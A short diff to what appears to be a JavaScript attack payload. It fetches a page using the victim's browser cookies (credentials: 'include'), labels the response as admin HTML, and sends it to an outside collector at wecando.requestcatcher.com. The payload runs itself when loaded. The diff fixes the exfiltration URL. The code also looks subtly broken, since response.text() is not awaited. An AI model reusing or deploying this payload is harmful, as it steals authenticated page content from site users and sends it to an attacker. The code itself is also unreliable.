@@ -30,8 +30,9 @@ async function getRealData() {
   const testurl = "https://m1ra1b0t.github.io/";
   const response =  await fetch(testurl, {credentials: 'include',});
   const adminHtml = response.text();
+  const adminHtmlEncoded = encodeURIComponent(adminHtml);
   // Usage example
-  fetch(`https://wecando.requestcatcher.com/adminhtml/{encodeURIComponent(adminHtml)}`);
+  fetch("https://wecando.requestcatcher.com/adminhtml/" + adminHtmlEncoded);
 }
 //getData('https://wecando.requestcatcher.com/data');
 getRealData();
